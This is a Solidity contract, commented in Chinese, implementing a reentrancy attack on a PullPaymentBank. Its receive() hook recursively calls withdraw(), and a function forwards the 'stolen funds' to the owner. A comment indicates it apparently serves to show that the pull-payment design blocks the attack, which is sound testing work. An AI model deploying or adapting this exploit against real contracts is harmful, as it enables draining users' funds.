// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./PullPaymentBank.sol";

/**
 * 恶意攻击合约，这个攻击合约会在收到钱时，尝试再次调用 withdraw() 来重入
 */
contract ReentrancyAttackPull {

    PullPaymentBank public bank;
    address public owner;

    constructor(address _bank) {
        bank = PullPaymentBank(_bank);
        owner = msg.sender;
    }

    // 在收到 ETH 时尝试再调用 withdraw()
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(); // 在安全合约里会失败
        }
    }

    // 启动攻击流程
    function attack() external payable {
        require(msg.value >= 1 ether, "Need >= 1 ETH");

        // 首先存入 1 ETH
        bank.deposit{value: msg.value}();

        // 发起第一次提现
        bank.withdraw();
    }

    // 提取本合约中资金
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}
